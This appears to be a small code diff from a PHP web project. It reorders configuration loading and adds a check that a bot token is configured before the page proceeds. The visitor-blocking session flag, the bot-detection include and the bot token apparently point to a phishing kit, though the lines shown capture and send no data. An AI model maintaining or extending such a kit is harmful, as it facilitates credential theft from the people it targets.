@@ -11,13 +11,14 @@ if(isset($_SESSION['404-blocked']) || isset($_SESSION['complete'])){
    exit();
 }
 
-if (!file_exists(__DIR__ . '/../config.json')) {
+require_once(__DIR__ . '/../includes/php/config.php');
+$configPath = __DIR__ . '/../config.json';
+if (!is_readable($configPath) || trim((string) ($config['bot_token'] ?? '')) === '') {
    header('Location: ../client-area/');
    exit();
 }
 
 include_once(__DIR__ . '/../includes/php/detect.php');
-require_once(__DIR__ . '/../includes/php/config.php');
 require_once(__DIR__ . '/../includes/php/buttons.php');
 
 if($config['status'] != 'online'){
